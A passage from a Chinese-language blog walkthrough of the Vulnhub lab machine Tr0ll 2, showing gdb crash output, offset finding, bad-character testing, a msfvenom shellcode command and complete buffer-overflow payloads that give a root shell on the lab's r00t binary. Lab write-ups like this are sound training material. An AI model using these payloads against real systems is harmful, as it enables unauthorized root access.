Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\n//\nrogram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: <span class=\"hljs-number\">0x12c</span> \nEBX: <span class=\"hljs-number\">0xf7f95e14</span> --> <span class=\"hljs-number\">0x227d0c</span> (<span class=\"hljs-string\">'\\x0c}\"'</span>)\nECX: <span class=\"hljs-number\">0x0</span> \nEDX: <span class=\"hljs-number\">0x0</span> \nESI: <span class=\"hljs-number\">0x80484b0</span> (&#x3C;__libc_csu_init>:      push   ebp)\nEDI: <span class=\"hljs-number\">0xf7ffcb60</span> --> <span class=\"hljs-number\">0x0</span> \nEBP: <span class=\"hljs-number\">0x41386941</span> (<span class=\"hljs-string\">'Ai8A'</span>)\nESP: <span class=\"hljs-number\">0xffffce70</span> (<span class=\"hljs-string\">\"0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\"</span>)\nEIP: <span class=\"hljs-number\">0x6a413969</span> (<span class=\"hljs-string\">'i9Aj'</span>)\nEFLAGS: <span class=\"hljs-number\">0x10282</span> (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n</code></pre>\n<p><code>EIP</code>被<code>i9Aj</code>覆盖，使用offset得出偏移量</p>\n<pre><code class=\"hljs language-python\">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q i9Aj\n[*] Exact <span class=\"hljs-keyword\">match</span> at offset <span class=\"hljs-number\">268</span>\n</code></pre>\n<p>得出偏移量<code>268</code></p>\n</li>\n<li>\n<p>查看一下利用的ESP <code>0xffffd350</code> ，小端取反就是 <code>'\\x50\\xd3\\xff\\xff'</code></p>\n</li>\n<li>\n<p>利用思路：<code>eip</code>覆盖为<code>esp</code>的地址，然后<code>esp</code>放入<code>shellcode</code></p>\n</li>\n<li>\n<p>坏字节判断</p>\n<p><a href=\"https://github.com/cytopia/badchars\">https://github.com/cytopia/badchars</a></p>\n<p>坏字节字典，放到<code>esp</code>区域提交</p>\n<pre><code class=\"hljs language-python\">gdb-peda$ r $(python -c <span class=\"hljs-string\">\"print('A'*268+'b'*4+'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff')\"</span>)\n</code></pre>\n<p>然后使用 <code>x/256b $esp</code> <code>x/256x $esp</code> 和坏字节字典进行对比，如果某个字节后面跟着的是<code>0x00</code> ，就表示那个字节后面那个是坏字节，把它删掉后再放进放到<code>esp</code>区域提交，以此类推，当<code>x/256b $esp</code> <code>x/256x $esp</code> 显示的是连续的中间没有0x00就表示剔除干净了</p>\n<p>发现的坏字节：<code>\\x00 \\x0a \\x0b \\x09 \\x20</code></p>\n</li>\n<li>\n<p>使用msfvenom生成shellcode</p>\n<pre><code class=\"hljs language-python\">**msfvenom -a x86 -p linux/x86/<span class=\"hljs-built_in\">exec</span> CMD=/<span class=\"hljs-built_in\">bin</span>/sh -b <span class=\"hljs-string\">'\\x00\\x09\\x0a\\x20'</span> -e x86/shikata_ga_nai -fc\n//**\n[-] No platform was selected, choosing Msf::Module::Platform::Linux <span class=\"hljs-keyword\">from</span> the payload\nFound <span class=\"hljs-number\">1</span> compatible encoders\nAttempting to encode payload <span class=\"hljs-keyword\">with</span> <span class=\"hljs-number\">1</span> iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai succeeded <span class=\"hljs-keyword\">with</span> size <span class=\"hljs-number\">70</span> (iteration=<span class=\"hljs-number\">0</span>)\nx86/shikata_ga_nai chosen <span class=\"hljs-keyword\">with</span> final size <span class=\"hljs-number\">70</span>\nPayload size: <span class=\"hljs-number\">70</span> <span class=\"hljs-built_in\">bytes</span>\nFinal size of c file: <span class=\"hljs-number\">319</span> <span class=\"hljs-built_in\">bytes</span>\nunsigned char buf[] = \n<span class=\"hljs-string\">\"\\xd9\\xd0\\xd9\\x74\\x24\\xf4\\xbb\\x19\\x0d\\x8d\\xc3\\x5e\\x31\\xc9\"</span>\n<span class=\"hljs-string\">\"\\xb1\\x0b\\x83\\xee\\xfc\\x31\\x5e\\x16\\x03\\x5e\\x16\\xe2\\xec\\x67\"</span>\n<span class=\"hljs-string\">\"\\x86\\x9b\\x97\\x2a\\xfe\\x73\\x8a\\xa9\\x77\\x64\\xbc\\x02\\xfb\\x03\"</span>\n<span class=\"hljs-string\">\"\\x3c\\x35\\xd4\\xb1\\x55\\xab\\xa3\\xd5\\xf7\\xdb\\xbc\\x19\\xf7\\x1b\"</span>\n<span class=\"hljs-string\">\"\\x92\\x7b\\x9e\\x75\\xc3\\x08\\x08\\x8a\\x4c\\xbc\\x41\\x6b\\xbf\\xc2\"</span>\n</code></pre>\n<p>payload</p>\n<pre><code class=\"hljs language-python\">./r00t $(python -c <span class=\"hljs-string\">'print \"A\"*268 + \"\\x50\\xd3\\xff\\xff\" + \"\\x90\"*20 + \"\\xd9\\xd0\\xd9\\x74\\x24\\xf4\\xbb\\x19\\x0d\\x8d\\xc3\\x5e\\x31\\xc9\\xb1\\x0b\\x83\\xee\\xfc\\x31\\x5e\\x16\\x03\\x5e\\x16\\xe2\\xec\\x67\\x86\\x9b\\x97\\x2a\\xfe\\x73\\x8a\\xa9\\x77\\x64\\xbc\\x02\\xfb\\x03\\x3c\\x35\\xd4\\xb1\\x55\\xab\\xa3\\xd5\\xf7\\xdb\\xbc\\x19\\xf7\\x1b\\x92\\x7b\\x9e\\x75\\xc3\\x08\\x08\\x8a\\x4c\\xbc\\x41\\x6b\\xbf\\xc2\"'</span>)\n// 这里我死活提不了权，网上找了别人的payload发现可以提权，主要原因是ESP的地址不同\n**./r00t $(python -c <span class=\"hljs-string\">'print \"A\"*268 + \"\\x80\\xfb\\xff\\xbf\" + \"\\x90\"*20 +** \"\\xba\\x19\\xb3\\xb8\\x79\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x5d\\x29\\xc9\\xb1\\x0b\\x31\\x55\\x15\\x83\\xed\\xfc\\x03\\x55\\x11\\xe2\\xec\\xd9\\xb3\\x21\\x97\\x4c\\xa2\\xb9\\x8a\\x13\\xa3\\xdd\\xbc\\xfc\\xc0\\x49\\x3c\\x6b\\x08\\xe8\\x55\\x05\\xdf\\x0f\\xf7\\x31\\xd7\\xcf\\xf7\\xc1\\xc7\\xad\\x9e\\xaf\\x38\\x41\\x08\\x30\\x10\\xf6\\x41\\xd1\\x53\\x78\"'</span>)\n// 明明做法是一样的，不过我注意到我的esi和edx也有数据，不知道是不是影响ESP\n</code></pre>\n<p>提权后是root权限，root目录下就是Proof.txt文件</p>\n<pre><code class=\"hljs language-python\">cat Proof.txt\nYou win this time young Jedi...\n\na70354f0258dcc00292c72aab3c8b1e4\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>缓冲区溢出难，没理解完</p>","title":"Vulnhub - Tr0ll 2 half","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Tr0ll: 2 half\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，`155`为靶机\n    \n    \n    \n2. 扫描主机所有端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nFTP - 1\n\n1. 尝试了anonymous，发现没启动匿名登陆\n\nweb\n\n1. 访问主页，有一张图片（..."},"recentPosts":[{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"}]},"__N_SSG":true}